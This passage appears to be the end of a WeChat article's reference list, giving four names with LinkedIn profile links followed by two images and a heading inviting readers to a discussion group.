[57]  
 Mark Manning: https://www.linkedin.com/in/markmmanning/  
[58]  
 CJ Cullen: https://www.linkedin.com/in/cjcullen/  
[59]  
 Julien Boeuf: https://www.linkedin.com/in/julien-boeuf-15b8/  
[60]  
 Ayub Yusuf: https://www.linkedin.com/in/ayubyusuf/  
  
   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/d7OsfYudM4bR8DASYvDbCZjOJkQqt4T2ZNe9tWFvAOCrk6RNMWsmse6g2rjDUYA5NHnGp0vcZHr4kGcMjMoicvQ/640?wx_fmt=gif&from=appmsg "")  
  
  
  
**交流群**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4bR8DASYvDbCZjOJkQqt4T2EibkuLqxg2YvLrDhYYXMUsPukCiaNqbrdHuk0iaCtic8VAt0BWe5tzRQgg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
